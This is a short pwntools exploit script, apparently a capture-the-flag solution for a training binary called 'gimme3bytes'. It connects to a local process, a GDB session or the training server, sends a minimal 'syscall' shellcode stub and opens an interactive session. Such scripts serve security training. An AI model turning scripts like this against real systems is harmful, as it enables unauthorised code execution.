from pwn import *
from time import sleep

elf = ELF('./gimme3bytes')
context.arch = 'amd64'
context.terminal = ['konsole', '-e']

if 'REM' in os.environ:
    p = remote('open-read-write.training.offensivedefensive.it', 8080, ssl=True)
else:
    if 'GDB' in os.environ:
        print('DEBUG MODE')
        p = gdb.debug('./gimme3bytes', api=True, gdbscript='''
        b *0x00401539
        c
        ''')
    else:
        p = elf.process()

def stop(s='Waiting...'):
    if 'NOSTP' not in os.environ: input(s)
    else: sleep(1)

sh = f'''
syscall
'''

sleep(0.5)
log.info(p.clean())
sleep(0.5)

p.sendline(asm(sh))

log.success(p.clean())

p.interactive()